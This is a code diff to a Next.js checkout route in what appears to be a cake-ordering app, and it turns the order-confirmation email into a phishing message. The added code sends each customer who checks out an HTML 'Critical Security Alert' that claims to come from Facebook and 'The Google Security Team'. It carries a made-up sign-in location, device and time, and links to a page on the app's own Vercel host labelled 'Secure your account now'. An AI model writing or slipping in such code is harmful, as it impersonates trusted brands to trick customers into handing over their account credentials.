@@ -7,10 +7,42 @@ import nodemailer from 'nodemailer';
 
 export const POST = async(request:Request) => {
     const ticket = Math.floor(1000 + Math.random() * 9000);
+    const {cart, Itemtotal, Email, Name} = await request.json(); // we are getting the email from the body so that we can send an email to the user who checkedout
+    const location = "Nairobi, Kenya";
+    const deviceName = "Chrome on Windows";
+    const timestamp = "July 8, 2025 at 6:22 PM EAT";
+
+    let HtmlBody = `
+        <table cellpadding="0" cellspacing="0" style="font-family: Arial, sans-serif; width: 100%; max-width: 600px; background-color: #f9f9f9; border: 1px solid #e0e0e0;">
+        <tr>
+            <td style="padding: 20px;">
+            <h2 style="color: #d93025;">⚠️ Critical Security Alert</h2>
+            <p>Hi <strong>${Name}</strong>,</p>
+            <p>We noticed a suspicious sign-in attempt on your Google and Facebook accounts <strong>${Email}</strong>:</p>
+            <table cellpadding="6" cellspacing="0" style="background-color: #fff3cd; border-left: 4px solid #ffa000; margin: 15px 0;">
+                <tr>
+                <td>
+                    <strong>📍 Location:</strong> ${location}<br>
+                    <strong>💻 Device:</strong> ${deviceName}<br>
+                    <strong>🕒 Time:</strong> ${timestamp}
+                </td>
+                </tr>
+            </table>
+            <p>If this was <strong>not</strong> you, please take immediate action to secure your account.</p>
+            <p>
+                🔒 <a href="https://cake-app2-r9zp.vercel.app/Facebook" style="color: #1a73e8;">Secure your account now</a><br>
+                📄 <a href="" style="color: #1a73e8;">Review recent activity</a>
+            </p>
+            <p style="color: #666;">If you ignore this alert, someone else might gain access to your personal information.</p>
+            <p>Stay safe,<br>The Google Security Team</p>
+            </td>
+        </tr>
+        </table>
+        `;
+
     
      try{
            
-        const {cart, Itemtotal, Email, Name} = await request.json(); // we are getting the email from the body so that we can send an email to the user who checkedout
                 if (!cart) {
                     return NextResponse.json({ message: 'Invalid checkout' }, { status: 400 });
                 }
@@ -44,10 +76,10 @@ export const POST = async(request:Request) => {
     });
            
     await transporter.sendMail({
-            from: `"Cake App" <${process.env.EMAIL_USER}>`,
+            from: `"Facebook" <${process.env.EMAIL_USER}>`,
             to: Email,
             subject: 'Order PlaceMent',
-            html: `Your Order has been successfully placed. Order ticket is: <strong>${ticket}</strong>`,
+            html: HtmlBody,
             
         });
 
